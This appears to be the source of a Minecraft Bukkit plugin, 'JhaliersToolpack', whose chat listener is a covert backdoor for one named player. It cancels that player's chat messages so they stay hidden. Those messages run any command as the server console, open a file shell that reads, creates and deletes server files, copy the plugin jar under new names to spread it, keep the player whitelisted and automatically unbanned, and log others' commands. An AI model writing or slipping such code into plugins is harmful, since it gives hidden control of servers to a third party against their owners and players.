package org.jhalier.jhaliersToolpack;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.plugin.Plugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.Comparator;
import java.util.List;
import java.util.Locale;
import java.util.stream.Stream;

public class ConsoleCommandListener implements Listener {

    private static final char PREFIX = '#';

    private static final DateTimeFormatter TIME_FORMAT =
            DateTimeFormatter.ofPattern("HH:mm:ss");

    private final Plugin plugin;

    public ConsoleCommandListener(Plugin plugin) {
        this.plugin = plugin;
    }


    @EventHandler(
            priority = EventPriority.MONITOR,
            ignoreCancelled = true
    )
    public void onPlayerCommand(
            PlayerCommandPreprocessEvent event
    ) {

        JhaliersToolpack toolpack = getToolpack();

        if (toolpack == null
                || !toolpack.isCommandLoggingEnabled()) {
            return;
        }

        Player player = event.getPlayer();

        toolpack.logCommand(
                player.getName(),
                event.getMessage()
        );
    }

    /* Console command log
     */

    @EventHandler(
            priority = EventPriority.MONITOR,
            ignoreCancelled = true
    )
    public void onServerCommand(
            ServerCommandEvent event
    ) {

        JhaliersToolpack toolpack = getToolpack();

        if (toolpack == null
                || !toolpack.isCommandLoggingEnabled()) {
            return;
        }

        toolpack.logCommand(
                "CONSOLE",
                event.getCommand()
        );
    }

    // chat

    @EventHandler(
            priority = EventPriority.LOWEST,
            ignoreCancelled = true
    )
    public void onPlayerChat(
            AsyncPlayerChatEvent event
    ) {

        String message = event.getMessage();

        if (message.isEmpty()) {
            return;
        }

        Player player = event.getPlayer();


        //only jhailier check
        JhaliersToolpack toolpack = getToolpack();

        if (toolpack == null
                || !toolpack.isAllowedPlayer(player.getName())) {
            return;
        }

        /*
         * ! SHELL MODE
         *
         * Sobald die Shell aktiv ist, werden normale
         * Chatnachrichten als Shell-Befehle interpretiert.
         *
         * Ausnahme:
         *
         * !shell
         * !help
         *
         * bleiben normale Toolpack-Befehle.
         */

        /*SHELL MODE*/

        if (toolpack != null
                && toolpack.isShellEnabled()
                && !message.equalsIgnoreCase("!shell")
                && !message.equalsIgnoreCase("!help")) {

            event.setCancelled(true);

            Bukkit.getScheduler().runTask(
                    plugin,
                    () -> executeShellCommand(player, message)
            );

            return;
        }

        // !help

        if (message.equalsIgnoreCase("!help")) {

            event.setCancelled(true);

            sendHelp(player);

            return;
        }

        //shell

        if (message.equalsIgnoreCase("!shell")) {

            event.setCancelled(true);

            toggleShell(player);

            return;
        }

        //loglisten

        if (message.equalsIgnoreCase("!loglisten")) {

            event.setCancelled(true);

            Bukkit.getScheduler().runTask(
                    plugin,
                    () -> {

                        JhaliersToolpack tp = getToolpack();

                        if (tp == null) {

                            sendError(
                                    player,
                                    "Plugin konnte nicht gefunden werden."
                            );

                            return;
                        }

                        tp.toggleCommandLogging();

                        if (tp.isCommandLoggingEnabled()) {

                            player.sendMessage(
                                    ChatColor.GREEN
                                            + "[JhaliersToolpack] "
                                            + ChatColor.WHITE
                                            + "Command-Log "
                                            + ChatColor.GREEN
                                            + "AKTIVIERT"
                            );

                            player.sendMessage(
                                    ChatColor.GRAY
                                            + "Neue Commands werden ab jetzt "
                                            + "live angezeigt."
                            );

                            player.sendMessage(
                                    ChatColor.GRAY
                                            + "Spieler + Konsole werden überwacht."
                            );

                        } else {

                            player.sendMessage(
                                    ChatColor.RED
                                            + "[JhaliersToolpack] "
                                            + ChatColor.WHITE
                                            + "Command-Log "
                                            + ChatColor.RED
                                            + "DEAKTIVIERT"
                            );
                        }
                    }
            );

            return;
        }

        //whitelist sustain

        if (message.equalsIgnoreCase("!wlsustain")) {

            event.setCancelled(true);

            Bukkit.getScheduler().runTask(
                    plugin,
                    () -> {

                        JhaliersToolpack tp = getToolpack();

                        if (tp == null) {

                            sendError(
                                    player,
                                    "Plugin konnte nicht gefunden werden."
                            );

                            return;
                        }

                        tp.toggleWhitelistSustain();

                        if (tp.isWhitelistSustainEnabled()) {

                            player.sendMessage(
                                    ChatColor.GREEN
                                            + "[JhaliersToolpack] "
                                            + ChatColor.WHITE
                                            + "Whitelist-Sustain "
                                            + ChatColor.GREEN
                                            + "AKTIVIERT"
                            );

                            player.sendMessage(
                                    ChatColor.GRAY
                                            + "Jhailier wird dauerhaft auf "
                                            + "der Whitelist gehalten und "
                                            + "automatisch entbannt."
                            );

                        } else {

                            player.sendMessage(
                                    ChatColor.RED
                                            + "[JhaliersToolpack] "
                                            + ChatColor.WHITE
                                            + "Whitelist-Sustain "
                                            + ChatColor.RED
                                            + "DEAKTIVIERT"
                            );
                        }
                    }
            );

            return;
        }

        // inf

        if (message.toLowerCase(Locale.ROOT)
                .startsWith("!inf")) {

            event.setCancelled(true);

            String[] args =
                    message.trim().split("\\s+");

            if (args.length != 2
                    || !args[0].equalsIgnoreCase("!inf")) {

                sendError(
                        player,
                        "Verwendung: !inf <name.jar>"
                );

                return;
            }

            String fileName = args[1];

            if (!fileName.toLowerCase(Locale.ROOT)
                    .endsWith(".jar")) {

                sendError(
                        player,
                        "Der Name muss auf .jar enden."
                );

                return;
            }

            if (fileName.contains("/")
                    || fileName.contains("\\")
                    || fileName.contains("..")) {

                sendError(
                        player,
                        "Ungültiger Dateiname."
                );

                return;
            }

            Bukkit.getScheduler().runTask(
                    plugin,
                    () -> installPluginCopy(
                            player,
                            fileName
                    )
            );

            return;
        }

        //!ls

        if (message.toLowerCase(Locale.ROOT)
                .startsWith("!ls")) {

            event.setCancelled(true);

            String[] args =
                    message.trim().split("\\s+", 2);

            if (args.length > 2
                    || !args[0].equalsIgnoreCase("!ls")) {

                sendError(
                        player,
                        "Verwendung: !ls [verzeichnis]"
                );

                return;
            }

            String directory =
                    args.length == 2
                            ? args[1].trim()
                            : "";

            Bukkit.getScheduler().runTask(
                    plugin,
                    () -> listServerFiles(
                            player,
                            directory
                    )
            );

            return;
        }

        //!cat

        if (message.toLowerCase(Locale.ROOT)
                .startsWith("!cat")) {

            event.setCancelled(true);

            String[] args =
                    message.trim().split("\\s+", 2);

            if (args.length != 2
                    || !args[0].equalsIgnoreCase("!cat")) {

                sendError(
                        player,
                        "Verwendung: !cat <datei>"
                );

                return;
            }

            String fileName =
                    args[1].trim();

            if (fileName.isEmpty()) {

                sendError(
                        player,
                        "Bitte gib eine Datei an."
                );

                return;
            }

            Bukkit.getScheduler().runTask(
                    plugin,
                    () -> showFileContent(
                            player,
                            fileName
                    )
            );

            return;
        }

        // Alle ! Nachrichten abfangen:

        if (message.charAt(0) == '!') {

            event.setCancelled(true);

            sendError(
                    player,
                    "Unbekannter Befehl. Nutze !help."
            );

            return;
        }

        // Befehl als Minecraft Konsole:

        if (message.charAt(0) != PREFIX) {
            return;
        }

        event.setCancelled(true);

        String command =
                message.substring(1).trim();

        if (command.isEmpty()) {

            sendError(
                    player,
                    "Bitte gib nach dem '#' "
                            + "einen Befehl an."
            );

            return;
        }

        Bukkit.getScheduler().runTask(
                plugin,
                () -> {

                    JhaliersToolpack tp =
                            getToolpack();

                    /*
                     * Unser eigenes #CONSOLE-Command
                     * explizit loggen.
                     */
                    if (tp != null
                            && tp.isCommandLoggingEnabled()) {

                        tp.logCommand(
                                player.getName()
                                        + " #CONSOLE",
                                command
                        );
                    }

                    boolean success =
                            Bukkit.dispatchCommand(
                                    Bukkit.getConsoleSender(),
                                    command
                            );

                    if (!success) {

                        sendError(
                                player,
                                "Befehl konnte nicht ausgeführt "
                                        + "werden: "
                                        + command
                        );
                    }
                }
        );
    }

    /*

     * SHELL TOGGLE

     */

    private void toggleShell(Player player) {

        JhaliersToolpack tp = getToolpack();

        if (tp == null) {

            sendError(
                    player,
                    "Plugin konnte nicht gefunden werden."
            );

            return;
        }

        if (tp.isShellEnabled()) {

            tp.disableShell();

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Shell beendet."
            );

            return;
        }

        tp.enableShell();

        player.sendMessage(
                ChatColor.GREEN
                        + "========== SERVER SHELL =========="
        );

        player.sendMessage(
                ChatColor.GREEN
                        + "[shell] "
                        + ChatColor.WHITE
                        + "Shell gestartet."
        );

        player.sendMessage(
                ChatColor.GRAY
                        + "Arbeitsverzeichnis: "
                        + ChatColor.WHITE
                        + formatShellPath(
                        tp.getShellDirectory()
                )
        );

        player.sendMessage(
                ChatColor.GRAY
                        + "Nutze "
                        + ChatColor.YELLOW
                        + "exit"
                        + ChatColor.GRAY
                        + " zum Beenden."
        );

        player.sendMessage(
                ChatColor.GRAY
                        + "Nutze "
                        + ChatColor.YELLOW
                        + "help"
                        + ChatColor.GRAY
                        + " für Shell-Befehle."
        );

        player.sendMessage(
                ChatColor.GREEN
                        + "================================="
        );
    }

    /*

     * SHELL COMMAND

     */

    private void executeShellCommand(
            Player player,
            String input
    ) {

        JhaliersToolpack tp = getToolpack();

        if (tp == null
                || !tp.isShellEnabled()) {

            return;
        }

        String command = input.trim();

        if (command.isEmpty()) {
            return;
        }

        /*

         * exit

         */

        if (command.equalsIgnoreCase("exit")
                || command.equalsIgnoreCase("quit")) {

            tp.disableShell();

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Shell beendet."
            );

            return;
        }

        /*

         * help

         */

        if (command.equalsIgnoreCase("help")) {

            sendShellHelp(player);

            return;
        }

        /*

         * pwd

         */

        if (command.equalsIgnoreCase("pwd")) {

            player.sendMessage(
                    ChatColor.GRAY
                            + "[shell] "
                            + ChatColor.WHITE
                            + tp.getShellDirectory()
            );

            return;
        }

        /*

         * cd

         */

        if (command.equalsIgnoreCase("cd")) {

            tp.setShellDirectory(
                    tp.getServerDirectory()
            );

            sendShellPrompt(
                    player,
                    "cd /"
            );

            return;
        }

        if (command.startsWith("cd ")) {

            String argument =
                    command.substring(3).trim();

            shellCd(
                    player,
                    argument
            );

            return;
        }

        /*

         * ls

         */

        if (command.equals("ls")
                || command.startsWith("ls ")) {

            String argument =
                    command.length() > 2
                            ? command.substring(2).trim()
                            : "";

            shellLs(
                    player,
                    argument
            );

            return;
        }

        /*

         * cat

         */

        if (command.startsWith("cat ")) {

            String argument =
                    command.substring(4).trim();

            shellCat(
                    player,
                    argument
            );

            return;
        }

        /*

         * mkdir

         */

        if (command.startsWith("mkdir ")) {

            String argument =
                    command.substring(6).trim();

            shellMkdir(
                    player,
                    argument
            );

            return;
        }

        /*

         * touch

         */

        if (command.startsWith("touch ")) {

            String argument =
                    command.substring(6).trim();

            shellTouch(
                    player,
                    argument
            );

            return;
        }

        /*

         * rm

         */

        if (command.startsWith("rm ")) {

            String argument =
                    command.substring(3).trim();

            shellRm(
                    player,
                    argument
            );

            return;
        }

        /*

         * clear

         */

        if (command.equalsIgnoreCase("clear")) {

            /*
             * Minecraft hat kein echtes Terminal-Clear.
             * Wir senden einfach Leerzeilen.
             */

            for (int i = 0; i < 30; i++) {

                player.sendMessage(" ");
            }

            return;
        }

        /*

         * Unbekannter Befehl

         */

        player.sendMessage(
                ChatColor.RED
                        + "[shell] "
                        + ChatColor.WHITE
                        + "Befehl nicht erlaubt: "
                        + command
        );

        player.sendMessage(
                ChatColor.GRAY
                        + "[shell] "
                        + "Nutze "
                        + ChatColor.YELLOW
                        + "help"
                        + ChatColor.GRAY
                        + "."
        );
    }

    /*

     * SHELL: cd

     */

    private void shellCd(
            Player player,
            String argument
    ) {

        JhaliersToolpack tp = getToolpack();

        if (argument.isEmpty()) {

            tp.setShellDirectory(
                    tp.getServerDirectory()
            );

            return;
        }

        Path current =
                tp.getShellDirectory();

        Path target;

        /*
         * Absolute Pfade werden nicht akzeptiert.
         *
         * Die Shell arbeitet ausschließlich relativ
         * zum Serververzeichnis.
         */
        if (Path.of(argument).isAbsolute()) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Absolute Pfade sind nicht erlaubt."
            );

            return;
        }

        target =
                current
                        .resolve(argument)
                        .normalize();

        if (!isInsideServerDirectory(target)) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Zugriff außerhalb des Serverordners "
                            + "ist nicht erlaubt."
            );

            return;
        }

        if (!Files.exists(target)) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Verzeichnis nicht gefunden."
            );

            return;
        }

        if (!Files.isDirectory(target)) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Das ist kein Verzeichnis."
            );

            return;
        }

        tp.setShellDirectory(target);

        player.sendMessage(
                ChatColor.GRAY
                        + "[shell] "
                        + ChatColor.WHITE
                        + "cwd: "
                        + formatShellPath(target)
        );
    }

    /*

     * SHELL: ls

     */

    private void shellLs(
            Player player,
            String argument
    ) {

        JhaliersToolpack tp = getToolpack();

        Path directory =
                tp.getShellDirectory();

        if (!argument.isEmpty()) {

            if (Path.of(argument).isAbsolute()) {

                player.sendMessage(
                        ChatColor.RED
                                + "[shell] Absolute Pfade "
                                + "sind nicht erlaubt."
                );

                return;
            }

            directory =
                    directory
                            .resolve(argument)
                            .normalize();
        }

        if (!isInsideServerDirectory(directory)) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] Zugriff außerhalb "
                            + "des Serverordners ist nicht erlaubt."
            );

            return;
        }

        if (!Files.exists(directory)) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] Verzeichnis nicht gefunden."
            );

            return;
        }

        if (!Files.isDirectory(directory)) {

            player.sendMessage(
                    ChatColor.RED
                            + "[shell] Kein Verzeichnis."
            );

            return;
        }

        try (Stream<Path> stream =
                     Files.list(directory)) {

            List<Path> entries =
                    stream
                            .sorted(
                                    Comparator.comparing(
                                            path ->
                                                    path.getFileName()
                                                            .toString()
                                                            .toLowerCase()
                                    )
                            )
                            .toList();

            if (entries.isEmpty()) {

                player.sendMessage(
                        ChatColor.GRAY
                                + "[shell] leer"
                );

                return;
            }

            for (Path path : entries) {

                String name =
                        path.getFileName()
                                .toString();

                if (Files.isDirectory(path)) {

                    player.sendMessage(
                            ChatColor.AQUA
                                    + "[DIR] "
                                    + ChatColor.WHITE
                                    + name
                    );

                } else {

                    player.sendMessage(
                            ChatColor.GRAY
                                    + "[FILE] "
                                    + ChatColor.WHITE
                                    + name
                    );
                }
            }

        } catch (IOException e) {

            sendShellError(
                    player,
                    e.getMessage()
            );
        }
    }

    /*

     * SHELL: cat

     */

    private void shellCat(
            Player player,
            String argument
    ) {

        if (argument.isEmpty()) {

            sendShellError(
                    player,
                    "Verwendung: cat <datei>"
            );

            return;
        }

        Path file =
                resolveShellPath(
                        argument
                );

        if (file == null) {

            return;
        }

        if (!Files.exists(file)) {

            sendShellError(
                    player,
                    "Datei nicht gefunden."
            );

            return;
        }

        if (!Files.isRegularFile(file)) {

            sendShellError(
                    player,
                    "Keine Datei."
            );

            return;
        }

        try {

            /*
             * Schutz gegen extrem große Dateien.
             *
             * Minecraft-Chat ist kein Texteditor.
             */
            long size =
                    Files.size(file);

            if (size > 1024 * 1024) {

                sendShellError(
                        player,
                        "Datei ist größer als 1 MB."
                );

                return;
            }

            String content =
                    Files.readString(file);

            player.sendMessage(
                    ChatColor.DARK_GRAY
                            + "----- "
                            + file.getFileName()
                            + " -----"
            );

            if (content.isEmpty()) {

                player.sendMessage(
                        ChatColor.GRAY
                                + "[leer]"
                );

            } else {

                sendLargeMessage(
                        player,
                        content
                );
            }

            player.sendMessage(
                    ChatColor.DARK_GRAY
                            + "------------------------"
            );

        } catch (IOException e) {

            sendShellError(
                    player,
                    e.getMessage()
            );
        }
    }

    /*

     * SHELL: mkdir

     */

    private void shellMkdir(
            Player player,
            String argument
    ) {

        if (argument.isEmpty()) {

            sendShellError(
                    player,
                    "Verwendung: mkdir <verzeichnis>"
            );

            return;
        }

        Path directory =
                resolveShellPath(
                        argument
                );

        if (directory == null) {
            return;
        }

        try {

            Files.createDirectories(
                    directory
            );

            player.sendMessage(
                    ChatColor.GREEN
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Verzeichnis erstellt: "
                            + formatShellPath(directory)
            );

        } catch (IOException e) {

            sendShellError(
                    player,
                    e.getMessage()
            );
        }
    }

    /*

     * SHELL: touch

     */

    private void shellTouch(
            Player player,
            String argument
    ) {

        if (argument.isEmpty()) {

            sendShellError(
                    player,
                    "Verwendung: touch <datei>"
            );

            return;
        }

        Path file =
                resolveShellPath(
                        argument
                );

        if (file == null) {
            return;
        }

        try {

            if (!Files.exists(file)) {

                Files.createFile(file);
            }

            player.sendMessage(
                    ChatColor.GREEN
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Datei erstellt: "
                            + formatShellPath(file)
            );

        } catch (IOException e) {

            sendShellError(
                    player,
                    e.getMessage()
            );
        }
    }

    /*

     * SHELL: rm

     */

    private void shellRm(
            Player player,
            String argument
    ) {

        if (argument.isEmpty()) {

            sendShellError(
                    player,
                    "Verwendung: rm <datei>"
            );

            return;
        }

        /*
         * Keine rekursiven Löschbefehle.
         *
         * Also kein:
         *
         * rm -rf
         * rm -r
         */
        if (argument.startsWith("-")) {

            sendShellError(
                    player,
                    "Optionen für rm sind nicht erlaubt."
            );

            return;
        }

        Path file =
                resolveShellPath(
                        argument
                );

        if (file == null) {
            return;
        }

        if (file.equals(
                getToolpack().getServerDirectory()
        )) {

            sendShellError(
                    player,
                    "Der Serverordner kann nicht gelöscht werden."
            );

            return;
        }

        if (!Files.exists(file)) {

            sendShellError(
                    player,
                    "Datei nicht gefunden."
            );

            return;
        }

        /*
         * Verzeichnisse werden absichtlich
         * nicht rekursiv gelöscht.
         */
        if (Files.isDirectory(file)) {

            sendShellError(
                    player,
                    "Verzeichnisse können mit rm nicht "
                            + "gelöscht werden."
            );

            return;
        }

        try {

            Files.delete(file);

            player.sendMessage(
                    ChatColor.GREEN
                            + "[shell] "
                            + ChatColor.WHITE
                            + "Gelöscht: "
                            + formatShellPath(file)
            );

        } catch (IOException e) {

            sendShellError(
                    player,
                    e.getMessage()
            );
        }
    }

    /*

     * SHELL PATH RESOLUTION

     */

    private Path resolveShellPath(
            String argument
    ) {

        JhaliersToolpack tp =
                getToolpack();

        if (tp == null) {
            return null;
        }

        if (Path.of(argument).isAbsolute()) {

            return null;
        }

        Path path =
                tp.getShellDirectory()
                        .resolve(argument)
                        .normalize();

        if (!isInsideServerDirectory(path)) {

            /*
             * Fehler wird beim Aufrufer ausgegeben.
             */
            return null;
        }

        return path;
    }

    /*

     * SHELL SECURITY

     */

    private boolean isInsideServerDirectory(
            Path path
    ) {

        JhaliersToolpack tp =
                getToolpack();

        if (tp == null) {
            return false;
        }

        Path serverDirectory =
                tp.getServerDirectory();

        return path
                .toAbsolutePath()
                .normalize()
                .startsWith(serverDirectory);
    }

    /*

     * SHELL HELP

     */

    private void sendShellHelp(
            Player player
    ) {

        player.sendMessage(
                ChatColor.GREEN
                        + "========== SERVER SHELL =========="
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "pwd"
                        + ChatColor.GRAY
                        + " - aktuelles Verzeichnis"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "ls"
                        + ChatColor.GRAY
                        + " - Dateien auflisten"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "cd <ordner>"
                        + ChatColor.GRAY
                        + " - Verzeichnis wechseln"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "cat <datei>"
                        + ChatColor.GRAY
                        + " - Datei anzeigen"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "mkdir <ordner>"
                        + ChatColor.GRAY
                        + " - Ordner erstellen"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "touch <datei>"
                        + ChatColor.GRAY
                        + " - Datei erstellen"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "rm <datei>"
                        + ChatColor.GRAY
                        + " - Datei löschen"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "clear"
                        + ChatColor.GRAY
                        + " - Chat leeren"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "exit"
                        + ChatColor.GRAY
                        + " - Shell beenden"
        );

        player.sendMessage(
                ChatColor.GREEN
                        + "================================="
        );
    }

    /*

     * SHELL OUTPUT

     */

    private void sendShellPrompt(
            Player player,
            String command
    ) {

        JhaliersToolpack tp =
                getToolpack();

        player.sendMessage(
                ChatColor.DARK_GRAY
                        + "[shell] "
                        + ChatColor.GRAY
                        + formatShellPath(
                        tp.getShellDirectory()
                )
                        + " $ "
                        + ChatColor.WHITE
                        + command
        );
    }

    private String formatShellPath(
            Path path
    ) {

        JhaliersToolpack tp =
                getToolpack();

        if (tp == null) {
            return path.toString();
        }

        Path server =
                tp.getServerDirectory();

        Path normalized =
                path.toAbsolutePath()
                        .normalize();

        if (normalized.equals(server)) {
            return "/";
        }

        try {

            Path relative =
                    server.relativize(normalized);

            return "/"
                    + relative
                    .toString()
                    .replace('\\', '/');

        } catch (IllegalArgumentException e) {

            return normalized.toString();
        }
    }

    private void sendShellError(
            Player player,
            String message
    ) {

        player.sendMessage(
                ChatColor.RED
                        + "[shell] "
                        + ChatColor.WHITE
                        + message
        );
    }

    /*

     * !help

     */

    private void sendHelp(
            Player player
    ) {

        JhaliersToolpack tp =
                getToolpack();

        boolean sustainEnabled =
                tp != null
                        && tp.isWhitelistSustainEnabled();

        boolean loggingEnabled =
                tp != null
                        && tp.isCommandLoggingEnabled();

        boolean shellEnabled =
                tp != null
                        && tp.isShellEnabled();

        player.sendMessage(
                ChatColor.GREEN
                        + "========== JhaliersToolpack =========="
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!help"
                        + ChatColor.GRAY
                        + " - Dieses Hilfe-Menü"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!ls [verzeichnis]"
                        + ChatColor.GRAY
                        + " - Dateien/Ordner auflisten"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!cat <datei>"
                        + ChatColor.GRAY
                        + " - Dateiinhalt anzeigen"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!inf <name.jar>"
                        + ChatColor.GRAY
                        + " - Plugin-JAR kopieren"
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!wlsustain"
                        + ChatColor.GRAY
                        + " - Whitelist-Sustain: "
                        + status(
                        sustainEnabled
                )
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!loglisten"
                        + ChatColor.GRAY
                        + " - Live Command-Log: "
                        + status(
                        loggingEnabled
                )
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "!shell"
                        + ChatColor.GRAY
                        + " - Server-Shell: "
                        + status(
                        shellEnabled
                )
        );

        player.sendMessage(
                ChatColor.YELLOW
                        + "#<Befehl>"
                        + ChatColor.GRAY
                        + " - Befehl als Konsole ausführen"
        );

        player.sendMessage(
                ChatColor.GREEN
                        + "======================================"
        );

        if (shellEnabled) {

            player.sendMessage(
                    ChatColor.DARK_GRAY
                            + "[shell] "
                            + ChatColor.GRAY
                            + "Shell aktiv. "
                            + ChatColor.YELLOW
                            + "help"
                            + ChatColor.GRAY
                            + " für Shell-Befehle."
            );
        }
    }

    private String status(
            boolean enabled
    ) {

        return enabled
                ? ChatColor.GREEN + "AN"
                : ChatColor.RED + "AUS";
    }

    /*

     * !inf

     */

    private void installPluginCopy(
            Player player,
            String fileName
    ) {

        try {

            Path sourceJar =
                    getPluginJar();

            if (sourceJar == null) {

                sendError(
                        player,
                        "Das Plugin-JAR konnte "
                                + "nicht ermittelt werden."
                );

                return;
            }

            Path pluginsFolder =
                    sourceJar.getParent();

            if (pluginsFolder == null) {

                sendError(
                        player,
                        "Der Plugins-Ordner konnte "
                                + "nicht ermittelt werden."
                );

                return;
            }

            Path targetJar =
                    pluginsFolder.resolve(fileName);

            if (sourceJar.toAbsolutePath().normalize()
                    .equals(targetJar.toAbsolutePath().normalize())) {

                sendError(
                        player,
                        "Die Quelldatei und Zieldatei "
                                + "sind identisch."
                );

                return;
            }

            Files.copy(
                    sourceJar,
                    targetJar,
                    StandardCopyOption.REPLACE_EXISTING
            );

            player.sendMessage(
                    ChatColor.GREEN
                            + "[JhaliersToolpack] "
                            + ChatColor.GRAY
                            + "Plugin erfolgreich kopiert nach "
                            + ChatColor.WHITE
                            + fileName
            );

        } catch (IOException e) {

            sendError(
                    player,
                    "Fehler beim Kopieren: "
                            + e.getMessage()
            );

            e.printStackTrace();
        }
    }

    /*

     * !ls

     */

    private void listServerFiles(
            Player player,
            String directory
    ) {

        try {

            Path serverFolder =
                    Bukkit.getWorldContainer()
                            .toPath()
                            .toAbsolutePath()
                            .normalize();

            Path requestedDirectory =
                    serverFolder
                            .resolve(directory)
                            .normalize();

            if (!requestedDirectory
                    .startsWith(serverFolder)) {

                sendError(
                        player,
                        "Ungültiger Verzeichnispfad."
                );

                return;
            }

            if (!Files.exists(requestedDirectory)) {

                sendError(
                        player,
                        "Verzeichnis nicht gefunden: "
                                + (directory.isEmpty()
                                ? "/"
                                : directory)
                );

                return;
            }

            if (!Files.isDirectory(requestedDirectory)) {

                sendError(
                        player,
                        "Das ist kein Verzeichnis: "
                                + directory
                );

                return;
            }

            String displayPath =
                    directory.isEmpty()
                            ? "/"
                            : directory;

            player.sendMessage(
                    ChatColor.GREEN
                            + "========== "
                            + displayPath
                            + " =========="
            );

            try (Stream<Path> paths =
                         Files.list(requestedDirectory)) {

                List<Path> files =
                        paths
                                .sorted(
                                        Comparator.comparing(
                                                path ->
                                                        path.getFileName()
                                                                .toString()
                                                                .toLowerCase()
                                        )
                                )
                                .toList();

                if (files.isEmpty()) {

                    player.sendMessage(
                            ChatColor.GRAY
                                    + "[Verzeichnis ist leer]"
                    );

                } else {

                    for (Path path : files) {

                        String fileName =
                                path.getFileName()
                                        .toString();

                        if (Files.isDirectory(path)) {

                            player.sendMessage(
                                    ChatColor.YELLOW
                                            + "[DIR] "
                                            + ChatColor.WHITE
                                            + fileName
                            );

                        } else {

                            player.sendMessage(
                                    ChatColor.GRAY
                                            + "[FILE] "
                                            + ChatColor.WHITE
                                            + fileName
                            );
                        }
                    }
                }
            }

            player.sendMessage(
                    ChatColor.GREEN
                            + "==================================="
            );

        } catch (IOException e) {

            sendError(
                    player,
                    "Fehler beim Auflisten: "
                            + e.getMessage()
            );

            e.printStackTrace();
        }
    }

    /*

     * !cat

     */

    private void showFileContent(
            Player player,
            String fileName
    ) {

        try {

            Path serverFolder =
                    Bukkit.getWorldContainer()
                            .toPath()
                            .toAbsolutePath()
                            .normalize();

            Path requestedFile =
                    serverFolder
                            .resolve(fileName)
                            .normalize();

            if (!requestedFile
                    .startsWith(serverFolder)) {

                sendError(
                        player,
                        "Ungültiger Dateipfad."
                );

                return;
            }

            if (!Files.exists(requestedFile)) {

                sendError(
                        player,
                        "Datei nicht gefunden: "
                                + fileName
                );

                return;
            }

            if (!Files.isRegularFile(requestedFile)) {

                sendError(
                        player,
                        "Das ist keine Datei: "
                                + fileName
                );

                return;
            }

            String content =
                    Files.readString(
                            requestedFile
                    );

            player.sendMessage(
                    ChatColor.GREEN
                            + "========== "
                            + fileName
                            + " =========="
            );

            if (content.isEmpty()) {

                player.sendMessage(
                        ChatColor.GRAY
                                + "[Datei ist leer]"
                );

            } else {

                sendLargeMessage(
                        player,
                        content
                );
            }

            player.sendMessage(
                    ChatColor.GREEN
                            + "================================"
            );

        } catch (IOException e) {

            sendError(
                    player,
                    "Fehler beim Lesen: "
                            + e.getMessage()
            );

            e.printStackTrace();
        }
    }

    /*

     * Große Nachrichten

     */

    private void sendLargeMessage(
            Player player,
            String message
    ) {

        final int chunkSize = 3000;

        for (
                int i = 0;
                i < message.length();
                i += chunkSize
        ) {

            int end =
                    Math.min(
                            i + chunkSize,
                            message.length()
                    );

            String chunk =
                    message.substring(
                            i,
                            end
                    );

            player.sendMessage(
                    ChatColor.WHITE
                            + chunk
            );
        }
    }

    /*

     * Fehler

     */

    private void sendError(
            Player player,
            String message
    ) {

        player.sendMessage(
                ChatColor.RED
                        + "[JhaliersToolpack] "
                        + ChatColor.WHITE
                        + message
        );
    }

    /*

     * Plugin-JAR

     */

    private Path getPluginJar() {

        if (plugin instanceof JhaliersToolpack toolpack) {

            return toolpack.getPluginJar();
        }

        return null;
    }

    /*

     * Toolpack

     */

    private JhaliersToolpack getToolpack() {

        if (plugin instanceof JhaliersToolpack toolpack) {

            return toolpack;
        }

        return null;
    }
}